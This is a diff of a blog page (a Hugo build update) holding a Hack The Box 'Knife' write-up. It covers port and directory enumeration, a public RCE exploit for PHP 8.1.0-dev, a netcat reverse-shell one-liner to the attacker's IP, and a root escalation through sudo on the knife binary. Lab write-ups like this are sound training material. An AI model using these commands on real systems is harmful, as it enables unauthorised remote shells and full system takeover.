@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -61,7 +61,7 @@ Contact Me
 I am Nasef and today I am going to show you how I hacked Knife machine from hack the box, so let&rsquo;s get started!</p>
 <h3 id=services-enumeration>Services Enumeration</h3>
 <p>Nmap found ports ssh(22) and http (80) open which isn&rsquo;t interesting in itself.</p>
-<pre><code>nmap -sC -sV 10.10.10.242
+<pre tabindex=0><code>nmap -sC -sV 10.10.10.242
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:08 EDT
 Nmap scan report for 10.10.10.242
 Host is up (0.16s latency).
@@ -81,7 +81,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 49.77 seconds
 
 </code></pre><p>I ran another nmap scan -sU for enumerating udp services and found two filtered ports, I may look into them.</p>
-<pre><code>nmap -sU 10.10.10.242
+<pre tabindex=0><code>nmap -sU 10.10.10.242
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:08 EDT
 Stats: 0:13:55 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
 UDP Scan Timing: About 86.59% done; ETC: 12:24 (0:02:09 remaining)
@@ -97,7 +97,7 @@ PORT      STATE         SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 999.46 seconds
 
 </code></pre><p>I ran another nmap scan -p- for enumerating the non-default ports but it gave me nothing new.</p>
-<pre><code>nmap -p- 10.10.10.242
+<pre tabindex=0><code>nmap -p- 10.10.10.242
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:08 EDT
 Nmap scan report for 10.10.10.242
 Host is up (0.17s latency).
@@ -112,7 +112,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1054.16 seconds
 <h3 id=exploiting-http-service>Exploiting HTTP Service</h3>
 <p>Using the current information, I decided to further enumerate the http service, but first I added the hostname of the machine in /etc/hosts because some machines use host routing.</p>
 <p>Then I ran gobuster to enumerate hidden directories, which gave me nothing.</p>
-<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://knife.htb/ -x php,txt,git
+<pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://knife.htb/ -x php,txt,git
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -141,11 +141,11 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 <p>I opened burpsuite to see what is the request and response look like and found in the response that this website is powered by php 8.1.0-dev,
 <img src=/images/blog/014/4.png alt=Username></p>
 <p>I decided to search for any public vulnerabilities for this version and found a ready to run RCE exploit!</p>
-<pre><code>https://www.exploit-db.com/exploits/49933
+<pre tabindex=0><code>https://www.exploit-db.com/exploits/49933
 </code></pre><p>I ran the exploit and made a reverse connection to get full working shell</p>
-<pre><code>nc -lvnp nc -lvnp 1111
+<pre tabindex=0><code>nc -lvnp nc -lvnp 1111
 
-</code></pre><pre><code>python3 49933.py                                                                                     
+</code></pre><pre tabindex=0><code>python3 49933.py                                                                                     
 Enter the full host url:
 http://knife.htb
 
@@ -156,14 +156,14 @@ $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 1111 
 </code></pre><p>and voila we got into the machine.</p>
 <h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>Before running any heavy privesc scripts, I prefer going through my manual checklist. Starting with sudo, I found that I can run the knife binary as root without password</p>
-<pre><code>$ sudo -l
+<pre tabindex=0><code>$ sudo -l
 Matching Defaults entries for james on knife:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 </code></pre><p>After searching I was able to ran ruby commands using knife, so I ran the following command and got root</p>
-<pre><code>$ sudo /usr/bin/knife exec -E 'exec &quot;/bin/bash&quot;'
+<pre tabindex=0><code>$ sudo /usr/bin/knife exec -E 'exec &quot;/bin/bash&quot;'
 whoami
 root
 cat /root/root.txt
